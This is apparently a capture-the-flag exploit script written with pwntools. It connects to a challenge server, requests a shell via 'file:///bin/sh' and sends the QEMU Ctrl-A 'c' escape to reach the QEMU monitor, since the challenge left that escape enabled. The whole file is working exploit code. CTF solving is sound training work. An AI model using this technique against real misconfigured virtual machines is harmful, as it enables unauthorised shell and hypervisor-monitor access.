# credit to the person who found this
# turns out you need to manually disable the escape character in qemu
# you can access the qemu monitor itself with it enabled by default (woops!)

from pwn import *

r = remote("challs.ctf.rusec.club", 47095)

r.sendline(b"file:///bin/sh")

r.recvuntil(b"$")

r.sendline(b"\x01c")
r.interactive()